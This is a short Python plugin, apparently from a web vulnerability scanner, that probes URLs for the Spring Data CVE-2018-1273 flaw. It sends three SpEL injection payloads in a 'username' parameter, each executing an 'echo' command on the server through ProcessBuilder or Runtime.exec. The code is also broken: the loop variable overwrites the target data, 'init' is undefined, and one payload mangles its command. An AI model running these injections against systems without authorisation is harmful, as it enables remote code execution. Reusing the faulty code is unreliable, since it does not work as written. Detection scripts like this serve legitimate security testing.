#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

def get_script_info(data=None):
    script_info = {
        "name": "spring_cve_2018_1273",
        "info": "spring_cve_2018_1273.",
        "level": "high",
        "type": "info"
    }
    return script_info

def prove(data):
    data = init(data,'web')
    if data['url']:
        try:
            datas = ['username[(#root.getClass().forName("java.lang.ProcessBuilder").getConstructor(\'foo\'.split('').getClass()).newInstance(\'ecxxho%20springxx_test\'.split(\'xx\'))).start()]=test',
                'username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\'echo%20spring_test\')")]=test',
                'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("echo%20spring_test")]=test']
            for data in datas:
                res = requests.get(data['url'], data = data,headers=data['headers'], verify=False, timeout=data['timeout'])
                if "spring_test" in res.text :
                    data['flag'] = 0
                    data['data'].append({"name": 'spring_cve_2018_1273'})
                    data['res'].append({"info": data['url'], "key": "username"})
                    break
        except:
            pass
    return data
